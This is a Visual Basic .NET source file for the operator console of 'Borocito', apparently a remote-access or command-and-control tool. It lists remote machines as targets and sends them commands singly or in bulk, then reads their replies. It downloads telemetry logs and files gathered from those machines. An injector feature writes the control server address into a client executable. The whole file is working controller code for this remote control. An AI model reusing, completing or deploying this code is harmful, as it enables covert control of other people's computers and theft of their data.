Imports System.IO
Imports System.Net.Http
Public Class Main
    Dim IsThreadReadCMDServerRunning As Boolean = False
    Dim ThreadReadCMDServer As Threading.Thread = New Threading.Thread(New Threading.ThreadStart(AddressOf ReadCommandFile))
    Dim isMonoChannel As Boolean = True
    Dim isCommandFileBusy As Boolean = False

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        CheckForIllegalCrossThreadCalls = False
        Main_Users_Command_TabPage.Enabled = False
        Busy_Panel.Dock = DockStyle.Fill
        parameters = Command()
        ReadParameters(parameters)
    End Sub
    Private Sub Main_HelpRequested(sender As Object, hlpevent As HelpEventArgs) Handles Me.HelpRequested
        If MessageBox.Show("Borocito fue creado y desarrollado por Zhenboro." & vbCrLf & "¿Desea visitar el sitio oficial?", "Borocito Software", MessageBoxButtons.YesNo, MessageBoxIcon.Information) = DialogResult.Yes Then
            Process.Start("https://github.com/Borocito")
        End If
    End Sub
    Private Sub LoaderTimer_Tick(sender As Object, e As EventArgs) Handles LoaderTimer.Tick
        LoadIt()
    End Sub
    Sub LoadIt()
        Try
            Busy_Panel.Visible = True
            LoaderTimer.Stop()
            LoaderTimer.Enabled = False
            Init()
            Theme_CheckBox.Checked = isThemeActive
        Catch ex As Exception
            Status_Label.Text = AddToLog("LoadIt@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub
    Private Sub Main_KeyDown(sender As Object, e As KeyEventArgs) Handles Me.KeyDown
        If e.KeyCode = Keys.F5 Then
            Connected_Label.Text = "Reloading..."
            ResetIt()
            Init()
        End If
    End Sub

    Sub ResetIt()
        Try
            Main_Users_User_ListBox.Items.Clear()
            Main_Telemetry_Telemetry_ListBox.Items.Clear()
            Main_Telemetry_Files_ListBox.Items.Clear()
        Catch ex As Exception
            Status_Label.Text = AddToLog("ResetIt@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Private Sub Main_Users_User_ListBox_SelectedIndexChanged(sender As Object, e As EventArgs) Handles Main_Users_User_ListBox.SelectedIndexChanged
        SetTarget(Main_Users_User_ListBox.SelectedItem)
        If Not isMultiSelectMode Then
            Main_Users_Command_RichTextBox.SelectionColor = Color.Yellow
            Main_Users_Command_RichTextBox.AppendText(vbCrLf & Main_Users_Label.Text)
            If isThemeActive Then
                Main_Users_Command_RichTextBox.SelectionColor = Color.LimeGreen
            Else
                Main_Users_Command_RichTextBox.SelectionColor = Color.Black
            End If
        End If
    End Sub
    Private Sub Main_Users_User_ListBox_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles Main_Users_User_ListBox.MouseDoubleClick
        SetTarget(Main_Users_User_ListBox.SelectedItem)
        Dim threadGetUserInfo As Threading.Thread = New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf GetUserInfo))
        threadGetUserInfo.Start()
        'GetUserInfo()
    End Sub
    Private Sub Main_Telemetry_Telemetry_ListBox_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles Main_Telemetry_Telemetry_ListBox.MouseDoubleClick
        Dim threadGetTelemetryInfo As Threading.Thread = New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf GetTelemetryInfo))
        threadGetTelemetryInfo.Start(Main_Telemetry_Telemetry_ListBox.SelectedItem)
        'GetTelemetryInfo(ListBox2.SelectedItem)
    End Sub
    Private Sub Main_Telemetry_Files_ListBox_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles Main_Telemetry_Files_ListBox.MouseDoubleClick
        Dim threadGetTelemetryFile As Threading.Thread = New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf GetTelemetryFile))
        threadGetTelemetryFile.Start(Main_Telemetry_Files_ListBox.SelectedItem)
        'GetTelemetryFile(ListBox3.SelectedItem)
    End Sub

    Private Sub Theme_CheckBox_CheckedChanged(sender As Object, e As EventArgs) Handles Theme_CheckBox.CheckedChanged
        ThemeManager(Theme_CheckBox.Checked)
        isThemeActive = Theme_CheckBox.Checked
        SaveRegedit()
    End Sub
    Private Sub Main_Users_User_ListBox_KeyDown(sender As Object, e As KeyEventArgs) Handles Main_Users_User_ListBox.KeyDown
        If e.KeyCode = Keys.ShiftKey Then
            If isMultiSelectMode Then
                Main_Users_User_ListBox.SelectionMode = SelectionMode.One
                isMultiSelectMode = False
            Else
                Main_Users_User_ListBox.SelectionMode = SelectionMode.MultiSimple
                isMultiSelectMode = True
            End If
        End If
    End Sub
    Private Sub Main_Users_Command_ComboBox_TextChanged(sender As Object, e As EventArgs) Handles Main_Users_Command_ComboBox.TextChanged
        If Main_Users_Command_ComboBox.Text.ToLower Like "*@multichannel*" Then
            Main_Users_Command_RichTextBox.AppendText(vbCrLf & "Multi channel activated!" & vbCrLf)
            isMonoChannel = False
            Main_Users_Command_ComboBox.Text = Nothing
        ElseIf Main_Users_Command_ComboBox.Text.ToLower Like "*@monochannel*" Then
            Main_Users_Command_RichTextBox.AppendText(vbCrLf & "Mono channel activated!" & vbCrLf)
            isMonoChannel = True
            Main_Users_Command_ComboBox.Text = Nothing
        ElseIf Main_Users_Command_ComboBox.Text.ToLower Like "*@exit*" Then
            End
        End If
    End Sub

    Sub SetCMDStatus(ByVal response As String, ByVal status As String, Optional ByVal ScrollRichBox As Boolean = True)
        Try
            If response <> Nothing Then
                Main_Users_Command_RichTextBox.SelectionColor = Color.Lime
                Main_Users_Command_RichTextBox.AppendText(response)
                Main_Users_Command_RichTextBox.SelectionColor = Color.LimeGreen
            End If
            Status_Label.Text = status
            If ScrollRichBox Then
                Main_Users_Command_RichTextBox.ScrollToCaret()
            End If
        Catch ex As Exception
            Status_Label.Text = AddToLog("SetCMDStatus@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SetTarget(ByVal userValue As String)
        Try
            If isMultiSelectMode Then
                Main_Users_Label.Text = "Target: <multiselect>"
                Main_Users_Command_TabPage.Enabled = True
            Else
                Main_Users_Label.Text = "Target: " & userValue
                userTarget = userValue
                userIDTarget = userTarget.Replace("userID_", Nothing)
                userIDTarget = userIDTarget.Replace("telemetry_", Nothing)
                Main_Users_Command_TabPage.Enabled = True
            End If
        Catch ex As Exception
            Status_Label.Text = AddToLog("SetTarget@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Private Sub Main_Users_Command_ComboBox_KeyDown(sender As Object, e As KeyEventArgs) Handles Main_Users_Command_ComboBox.KeyDown
        If e.KeyCode = Keys.Enter Then
            If Main_Users_Command_ComboBox.Text <> Nothing Then
                If isMultiSelectMode Then
                    For Each usuario As String In Main_Users_User_ListBox.SelectedItems
                        SendCommandFile(usuario, Main_Users_Command_ComboBox.Text)
                    Next
                    Main_Users_Command_RichTextBox.AppendText(vbCrLf & "Server: Commands Sended! (" & Main_Users_Command_ComboBox.Text & ") to " & Main_Users_User_ListBox.SelectedItems.Count & " users")
                Else
                    SendCommandFile(userIDTarget, Main_Users_Command_ComboBox.Text)
                End If
                Status_Label.Text = Nothing
                If IsThreadReadCMDServerRunning = False Then
                    Status_Label.Text = "CMD Response thread started!"
                    ThreadReadCMDServer.Start()
                    IsThreadReadCMDServerRunning = True
                End If
            End If
        ElseIf e.KeyCode = Keys.ControlKey Then
            If IsThreadReadCMDServerRunning = False Then
                Status_Label.Text = "CMD Response thread started!"
                ThreadReadCMDServer.Start()
                IsThreadReadCMDServerRunning = True
            End If
        End If
    End Sub
    Dim LastUserResponse As String = Nothing
    Sub ReadCommandFile()
        While True
            Try
                Threading.Thread.Sleep(CommandRefreshDelay) '10 segundos

                Dim respuestas As String = Nothing

                'Descargar respuesta
                Using client As New HttpClient()
                    client.DefaultRequestHeaders.Add("User-Agent", AssemblyInformation)

                    Dim response As HttpResponseMessage = client.GetAsync(
                        HttpOwnerServer & "/control/instance/" & userIDTarget
                    ).Result

                    Dim respuestaTexto As String = response.Content.ReadAsStringAsync().Result

                    If response.IsSuccessStatusCode Then
                        respuestas = respuestaTexto
                    End If
                End Using

                Dim respuesta As String() = Split(respuestas, vbCrLf)
                Dim contenido As String = String.Join(vbNewLine, respuesta, 1, respuesta.Length - 1).Replace(vbCrLf, "")
                'Leer
                If respuestas = LastUserResponse Then
                    If respuestas <> Nothing Then
                        SetCMDStatus(Nothing, "The response (" & contenido & ") is equal to last", False)
                    Else
                        SetCMDStatus(Nothing, "No changes", False)
                    End If
                Else
                    LastUserResponse = respuestas
                    If LastUserResponse <> Nothing Or LastUserResponse <> contenido Then
                        SetCMDStatus(vbCrLf & respuestas.Split(vbCrLf)(0).Split("|")(1) & ": " & contenido & vbCrLf, Nothing)
                    End If
                End If
            Catch ex As Exception
                Status_Label.Text = AddToLog("ReadCommandFile@Network", "Error: " & ex.Message, True)
            End Try
        End While
    End Sub
    Sub SendCommandFile(ByVal user As String, ByVal command As String)
        isCommandFileBusy = True
        Status_Label.Text = "Sending command..."
        userIDTarget = user
        Try
            'Enviar el contenido
            Dim formData As New Dictionary(Of String, String) From {
                {"command", command}
            }
            Using content As New FormUrlEncodedContent(formData)
                Using client As New HttpClient()
                    client.DefaultRequestHeaders.Add("User-Agent", AssemblyInformation)
                    Dim response As HttpResponseMessage = client.PostAsync(
                            HttpOwnerServer & "/control/instance/" & userIDTarget,
                            content
                        ).Result
                End Using
            End Using

            If Not isMultiSelectMode Then
                Main_Users_Command_RichTextBox.AppendText(vbCrLf & "Server: Command Sended! (" & command & ")")
            End If
            LastUserResponse = Nothing
            Main_Users_Command_RichTextBox.ScrollToCaret()
            Main_Users_Command_ComboBox.Text = Nothing
        Catch ex As Exception
            Status_Label.Text = AddToLog("SendCommandFile@Main", "Error: " & ex.Message, True)
        End Try
        isCommandFileBusy = False
    End Sub

    Private Sub Main_Inject_Button_Click(sender As Object, e As EventArgs) Handles Main_Inject_Button.Click
        Dim injectableOpener As New OpenFileDialog
        injectableOpener.Filter = "All file types|*.*"
        injectableOpener.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
        injectableOpener.Title = "Abrir ejecutable inyectable..."
        injectableOpener.FileName = "Extractor.exe"
        If injectableOpener.ShowDialog() = DialogResult.OK Then
            Dim injectableSaver As New SaveFileDialog
            injectableSaver.Filter = "Executable file|*.exe"
            injectableSaver.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            injectableSaver.Title = "Guardar ejecutable inyectado..."
            injectableSaver.FileName = "Extractor"
            If injectableSaver.ShowDialog() = DialogResult.OK Then
                If Main_Inject_TextBox.Text <> Nothing Then
                    PutInject(Main_Inject_TextBox.Text, injectableOpener.FileName, injectableSaver.FileName)
                Else
                    If MessageBox.Show("No ha ingresado un servidor para inyectar." & vbCrLf & "¿Desea usar el servidor actual?", "Injector", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = DialogResult.Yes Then
                        PutInject(HttpOwnerServer, injectableOpener.FileName, injectableSaver.FileName)
                    End If
                End If
            End If
        End If
    End Sub
    Private Sub Main_General_Globals_Button_Click(sender As Object, e As EventArgs) Handles Main_General_Globals_Button.Click
        Try
            'Dim LocalFilePath As String = DIRCommons & "\Globals.ini"
            'Dim RemoteFilePath As String = HostOwnerServer & "/Globals.ini"
            'If My.Computer.FileSystem.FileExists(LocalFilePath) Then
            '    My.Computer.FileSystem.DeleteFile(LocalFilePath)
            'End If
            'My.Computer.FileSystem.WriteAllText(LocalFilePath, Main_General_Globals_RichTextBox.Text, False)
            'My.Computer.Network.UploadFile(LocalFilePath, RemoteFilePath, HostOwnerServerUser, HostOwnerServerPassword)
            'MsgBox("Globals aplicado.", MsgBoxStyle.Information, "Configuracion Servidor")
        Catch ex As Exception
            Status_Label.Text = AddToLog("SendGlobalsSettings@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub Main_General_BoroGet_Config_Button_Click(sender As Object, e As EventArgs) Handles Main_General_BoroGet_Config_Button.Click
        Try
            'Dim LocalFilePath As String = DIRCommons & "\BoroGet_config.ini"
            'Dim RemoteFilePath As String = HostOwnerServer & "/Boro-Get/config.ini"
            'If My.Computer.FileSystem.FileExists(LocalFilePath) Then
            '    My.Computer.FileSystem.DeleteFile(LocalFilePath)
            'End If
            'My.Computer.FileSystem.WriteAllText(LocalFilePath, Main_General_BoroGet_Config_RichTextBox.Text, False)
            'My.Computer.Network.UploadFile(LocalFilePath, RemoteFilePath, HostOwnerServerUser, HostOwnerServerPassword)
            'MsgBox("Boro-Get Configuration aplicado.", MsgBoxStyle.Information, "Configuracion Servidor Boro-Get")
        Catch ex As Exception
            Status_Label.Text = AddToLog("SendBoroGet(config)Settings@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub Main_General_BoroGet_Repositories_Button_Click(sender As Object, e As EventArgs) Handles Main_General_BoroGet_Repositories_Button.Click
        Try
            'Dim LocalFilePath As String = DIRCommons & "\BoroGet_Repositories.ini"
            'Dim RemoteFilePath As String = HostOwnerServer & "/Boro-Get/Repositories.ini"
            'If My.Computer.FileSystem.FileExists(LocalFilePath) Then
            '    My.Computer.FileSystem.DeleteFile(LocalFilePath)
            'End If
            'My.Computer.FileSystem.WriteAllText(LocalFilePath, Main_General_BoroGet_Repositories_RichTextBox.Text, False)
            'My.Computer.Network.UploadFile(LocalFilePath, RemoteFilePath, HostOwnerServerUser, HostOwnerServerPassword)
            'MsgBox("Boro-Get Repositories aplicado.", MsgBoxStyle.Information, "Configuracion Servidor Boro-Get")
        Catch ex As Exception
            Status_Label.Text = AddToLog("SendBoroGet(Repositories)Settings@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

#Region "LocalThings"
    Async Sub IndexUsersToPanel()
        Try
            Main_Users_User_ListBox.Items.Clear()
            Status_Label.Text = "WAIT: Loading user files from server..."

            Dim instancias As String = Nothing

            Using client As New HttpClient()
                client.DefaultRequestHeaders.Add("User-Agent", AssemblyInformation)

                Dim response As HttpResponseMessage = Await client.GetAsync(
                    HttpOwnerServer & "/control/list/instances"
                )

                Dim respuestaTexto As String = Await response.Content.ReadAsStringAsync()

                If response.IsSuccessStatusCode Then
                    instancias = respuestaTexto
                End If
            End Using

            Dim lineas As String() = instancias.Split("|")
            For Each linea As String In lineas
                Main_Users_User_ListBox.Items.Add(linea)
            Next

            Status_Label.Text = "User files loaded!"
        Catch ex As Exception
            Status_Label.Text = AddToLog("IndexUsersToPanel@(LocalThings@Main)Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Async Sub IndexTelemetryToPanel()
        Try
            Main_Telemetry_Telemetry_ListBox.Items.Clear()
            Status_Label.Text = "WAIT: Loading telemetry files from server..."

            Dim registros As String = Nothing

            Using client As New HttpClient()
                client.DefaultRequestHeaders.Add("User-Agent", AssemblyInformation)

                Dim response As HttpResponseMessage = Await client.GetAsync(
                    HttpOwnerServer & "/control/list/telemetry-logs"
                )

                Dim respuestaTexto As String = Await response.Content.ReadAsStringAsync()

                If response.IsSuccessStatusCode Then
                    registros = respuestaTexto
                End If
            End Using

            Dim lineas As String() = registros.Split(vbCrLf)
            For Each linea As String In lineas
                Main_Telemetry_Telemetry_ListBox.Items.Add(linea.Replace(vbLf, ""))
            Next

            Status_Label.Text = "Telemetry files loaded!"
        Catch ex As Exception
            Status_Label.Text = AddToLog("IndexTelemetryToPanel@(LocalThings@Main)Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Async Sub IndexTelemetryFilesToPanel()
        Try
            Main_Telemetry_Files_ListBox.Items.Clear()
            Status_Label.Text = "WAIT: Loading repository files from server..."

            Dim archivos As String = Nothing

            Using client As New HttpClient()
                client.DefaultRequestHeaders.Add("User-Agent", AssemblyInformation)

                Dim response As HttpResponseMessage = Await client.GetAsync(
                    HttpOwnerServer & "/control/list/telemetry-files"
                )

                Dim respuestaTexto As String = Await response.Content.ReadAsStringAsync()

                If response.IsSuccessStatusCode Then
                    archivos = respuestaTexto
                End If
            End Using

            Dim lineas As String() = archivos.Split(vbCrLf)
            For Each linea As String In lineas
                linea = linea.Remove(0, linea.LastIndexOf("/") + 1)
                Main_Telemetry_Files_ListBox.Items.Add(linea.Replace(vbLf, ""))
            Next

            Status_Label.Text = "Telemetry repository files loaded!"
        Catch ex As Exception
            Status_Label.Text = AddToLog("IndexTelemetryFilesToPanel@(LocalThings@Main)Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub DeleteTelemetryFile(ByVal fileName As String)
        Try
            ' TODO
            'Dim request As FtpWebRequest = CType(WebRequest.Create(HostOwnerServer & "/Files/" & fileName), FtpWebRequest)
            'request.Method = WebRequestMethods.Ftp.DeleteFile
            'request.Credentials = New NetworkCredential(HostOwnerServerUser, HostOwnerServerPassword)
            'Dim response As FtpWebResponse = CType(request.GetResponse(), FtpWebResponse)
            'Status_Label.Text = CType(response, FtpWebResponse).StatusDescription
            'response.Close()
        Catch ex As Exception
            Status_Label.Text = AddToLog("DeleteTelemetryFile@(LocalThings@Main)Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub DeleteUserFile(ByVal user As String)
        'user = user.Replace("userID_", Nothing)
        'Try
        '    ' TODO
        '    Try
        '        Dim request As FtpWebRequest = CType(WebRequest.Create(HostOwnerServer & "/Users/userID_" & user & ".rtp"), FtpWebRequest)
        '        request.Method = WebRequestMethods.Ftp.DeleteFile
        '        request.Credentials = New NetworkCredential(HostOwnerServerUser, HostOwnerServerPassword)
        '        Dim response As FtpWebResponse = CType(request.GetResponse(), FtpWebResponse)
        '        Status_Label.Text = CType(response, FtpWebResponse).StatusDescription
        '        response.Close()
        '    Catch ex As Exception
        '        Status_Label.Text = AddToLog("DeleteUserFile(UserFile)@(LocalThings@Main)Network", "Error: " & ex.Message, True)
        '    End Try
        '    Try
        '        Dim request As FtpWebRequest = CType(WebRequest.Create(HostOwnerServer & "/Users/Commands/[" & user & "]Command.str"), FtpWebRequest)
        '        request.Method = WebRequestMethods.Ftp.DeleteFile
        '        request.Credentials = New NetworkCredential(HostOwnerServerUser, HostOwnerServerPassword)
        '        Dim response As FtpWebResponse = CType(request.GetResponse(), FtpWebResponse)
        '        Status_Label.Text = CType(response, FtpWebResponse).StatusDescription
        '        response.Close()
        '    Catch ex As Exception
        '        Status_Label.Text = AddToLog("DeleteUserFile(CommandFile)@(LocalThings@Main)Network", "Error: " & ex.Message, True)
        '    End Try
        '    Try
        '        Dim request As FtpWebRequest = CType(WebRequest.Create(HostOwnerServer & "/Telemetry/telemetry_" & user & ".tlm"), FtpWebRequest)
        '        request.Method = WebRequestMethods.Ftp.DeleteFile
        '        request.Credentials = New NetworkCredential(HostOwnerServerUser, HostOwnerServerPassword)
        '        Dim response As FtpWebResponse = CType(request.GetResponse(), FtpWebResponse)
        '        Status_Label.Text = CType(response, FtpWebResponse).StatusDescription
        '        response.Close()
        '    Catch ex As Exception
        '        Status_Label.Text = AddToLog("DeleteUserFile(TelemetryFile)@(LocalThings@Main)Network", "Error: " & ex.Message, True)
        '    End Try
        'Catch ex As Exception
        '    Status_Label.Text = AddToLog("DeleteUserFile@(LocalThings@Main)Network", "Error: " & ex.Message, True)
        'End Try
    End Sub
    Async Sub GetTelemetryInfo(ByVal fileName As String)
        Try
            Dim registros As String = Nothing

            Using client As New HttpClient()
                client.DefaultRequestHeaders.Add("User-Agent", AssemblyInformation)

                Dim response As HttpResponseMessage = Await client.GetAsync(
                    HttpOwnerServer & "/control/get/telemetry-log/" & fileName.Replace(".log", "")
                )

                Dim respuestaTexto As String = Await response.Content.ReadAsStringAsync()

                If response.IsSuccessStatusCode Then
                    registros = respuestaTexto
                End If
            End Using

            Main_Telemetry_Telemetry_RichTextBox.Text = registros
        Catch ex As Exception
            Status_Label.Text = AddToLog("GetTelemetryInfo@(LocalThings@Main)Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Async Sub GetTelemetryFile(ByVal file As String)
        Try
            Dim downloadRefresh As Boolean = False
            Status_Label.Text = "WAIT: Asking file info..."

            Dim LocalTelemetryFile As String = DIRCommons & "\" & file
            Dim RemoteTelemetryFile As String = HttpOwnerServer & "/Files/" & file

            If My.Computer.FileSystem.FileExists(LocalTelemetryFile) Then
                If MessageBox.Show("El fichero ya existe en local." & vbCrLf & "¿Desea descargarlo nuevamente?", "Confirmar", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = DialogResult.Yes Then
                    Status_Label.Text = "WAIT: Downloading file from remote repository..."
                    My.Computer.FileSystem.DeleteFile(LocalTelemetryFile)
                Else
                    Status_Label.Text = "WAIT: Opening file from local repository..."
                    downloadRefresh = True
                End If
            End If

            If Not downloadRefresh Then
                Using client As New HttpClient()
                    Dim response As HttpResponseMessage = Await client.GetAsync(
                        HttpOwnerServer & "/control/get/telemetry-file/" & file
                    )

                    If Not response.IsSuccessStatusCode Then
                        Status_Label.Text = "File download failed."
                        Return
                    End If

                    Using inputStream = Await response.Content.ReadAsStreamAsync()
                        Using outputStream As New FileStream(LocalTelemetryFile, FileMode.Create)
                            inputStream.CopyTo(outputStream)
                        End Using
                    End Using

                End Using
            End If

            Status_Label.Text = "File ready! Asking for confirmation..."
            If MessageBox.Show("¿Abrir el fichero '" & file & "'?", "Confirmar", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = DialogResult.Yes Then
                Process.Start(LocalTelemetryFile)
            Else
                Process.Start("explorer.exe", "/select, " & LocalTelemetryFile)
            End If
            Status_Label.Text = Nothing
        Catch ex As Exception
            Status_Label.Text = AddToLog("GetTelemetryFile@(LocalThings@Main)Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Async Sub GetUserInfo()
        Try
            Dim reporte As String = Nothing

            Using client As New HttpClient()
                client.DefaultRequestHeaders.Add("User-Agent", AssemblyInformation)

                Dim response As HttpResponseMessage = Await client.GetAsync(
                    HttpOwnerServer & "/control/get/report/" & userIDTarget
                )

                Dim respuestaTexto As String = Await response.Content.ReadAsStringAsync()

                If response.IsSuccessStatusCode Then
                    reporte = respuestaTexto
                End If
            End Using

            Main_Users_User_RichTextBox.Text = reporte
        Catch ex As Exception
            Status_Label.Text = AddToLog("GetUserInfo@(LocalThings@Main)Network", "Error: " & ex.Message, True)
        End Try
    End Sub
#End Region

#Region "ToolStrip Items"
    Private Sub RecargarToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RecargarToolStripMenuItem.Click
        Dim threadIndexTelemetryFilesToPanel As Threading.Thread = New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf IndexTelemetryFilesToPanel))
        threadIndexTelemetryFilesToPanel.Start()
        'IndexTelemetryFilesToPanel()
    End Sub
    Private Sub EliminarToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EliminarToolStripMenuItem.Click
        Dim threadDeleteTelemetryFile As Threading.Thread = New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf DeleteTelemetryFile))
        threadDeleteTelemetryFile.Start(Main_Telemetry_Files_ListBox.SelectedItem)
        'DeleteTelemetryFile(ListBox3.SelectedItem)
    End Sub
    Private Sub Label_Status_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles Status_Label.MouseDoubleClick
        Status_Label.Text = Nothing
        LastUserResponse = Nothing
    End Sub
    Private Sub RecargarToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles RecargarToolStripMenuItem1.Click
        Dim threadIndexUsersToPanel As Threading.Thread = New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf IndexUsersToPanel))
        threadIndexUsersToPanel.Start()
        'IndexUsersToPanel()
    End Sub
    Private Sub EliminarToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles EliminarToolStripMenuItem1.Click
        If MessageBox.Show("Esta accion eliminara todos los archivos relacionados a este usuario." & vbCrLf & "¿Eliminar el usuario" & Main_Users_User_ListBox.SelectedItem & "?", "Eliminar usuario", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = DialogResult.Yes Then
            Dim threadDeleteUserFile As Threading.Thread = New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf DeleteUserFile))
            threadDeleteUserFile.Start(Main_Users_User_ListBox.SelectedItem)
            'DeleteUserFile(ListBox1.SelectedItem)
        End If
    End Sub

    Private Sub RecargarTodoToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RecargarTodoToolStripMenuItem.Click
        Main_KeyDown(Me, New KeyEventArgs(Keys.F5))
    End Sub
    Private Sub ConfiguracionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ConfiguracionToolStripMenuItem.Click

    End Sub
    Private Sub SalirToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SalirToolStripMenuItem.Click
        End
    End Sub
#End Region

    Sub ThemeManager(ByVal applyTheme As Boolean)
        Try
            If applyTheme Then
                'Aplicar thema
                Me.BackColor = Color.FromArgb(50, 50, 50)
                Me.BackColor = Color.Black
                Me.ForeColor = Color.LimeGreen
            Else
                'Desaplicar tema
                Me.BackColor = DefaultBackColor
                Me.ForeColor = DefaultForeColor
            End If

            For Each pagina As TabPage In Main_TabControl.Controls
                pagina.BackColor = Me.BackColor
                pagina.ForeColor = Me.ForeColor
            Next

            For Each pagina As TabPage In Main_Users_TabControl.Controls
                pagina.BackColor = Me.BackColor
                pagina.ForeColor = Me.ForeColor
            Next

            For Each pagina As TabPage In Main_General_TabControl.Controls
                pagina.BackColor = Me.BackColor
                pagina.ForeColor = Me.ForeColor
            Next

            For Each pagina As TabPage In Main_General_BoroGet_TabControl.Controls
                pagina.BackColor = Me.BackColor
                pagina.ForeColor = Me.ForeColor
            Next

            For Each pagina As TabPage In Main_Telemetry_TabControl.Controls
                pagina.BackColor = Me.BackColor
                pagina.ForeColor = Me.ForeColor
            Next

            Main_Users_User_GroupBox.BackColor = Me.BackColor
            Main_Users_User_GroupBox.ForeColor = Me.ForeColor

            Main_Users_Command_GroupBox.BackColor = Me.BackColor
            Main_Users_Command_GroupBox.ForeColor = Me.ForeColor

            Main_Inject_GroupBox.BackColor = Me.BackColor
            Main_Inject_GroupBox.ForeColor = Me.ForeColor

            Main_Users_User_RichTextBox.BackColor = Me.BackColor
            Main_Users_User_RichTextBox.ForeColor = Me.ForeColor

            Main_Users_Command_RichTextBox.BackColor = Me.BackColor
            Main_Users_Command_RichTextBox.ForeColor = Me.ForeColor

            Main_Telemetry_Telemetry_RichTextBox.BackColor = Me.BackColor
            Main_Telemetry_Telemetry_RichTextBox.ForeColor = Me.ForeColor

            Main_General_Globals_RichTextBox.BackColor = Me.BackColor
            Main_General_Globals_RichTextBox.ForeColor = Me.ForeColor

            Main_General_BoroGet_Config_RichTextBox.BackColor = Me.BackColor
            Main_General_BoroGet_Config_RichTextBox.ForeColor = Me.ForeColor

            Main_General_BoroGet_Repositories_RichTextBox.BackColor = Me.BackColor
            Main_General_BoroGet_Repositories_RichTextBox.ForeColor = Me.ForeColor

            Main_Users_User_ListBox.BackColor = Me.BackColor
            Main_Users_User_ListBox.ForeColor = Me.ForeColor

            Main_Telemetry_Telemetry_ListBox.BackColor = Me.BackColor
            Main_Telemetry_Telemetry_ListBox.ForeColor = Me.ForeColor

            Main_Telemetry_Files_ListBox.BackColor = Me.BackColor
            Main_Telemetry_Files_ListBox.ForeColor = Me.ForeColor

            Main_Users_Command_ComboBox.BackColor = Me.BackColor
            Main_Users_Command_ComboBox.ForeColor = Me.ForeColor

            Main_Inject_TextBox.BackColor = Me.BackColor
            Main_Inject_TextBox.ForeColor = Me.ForeColor

        Catch ex As Exception
            AddToLog("ThemeManager@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
End Class
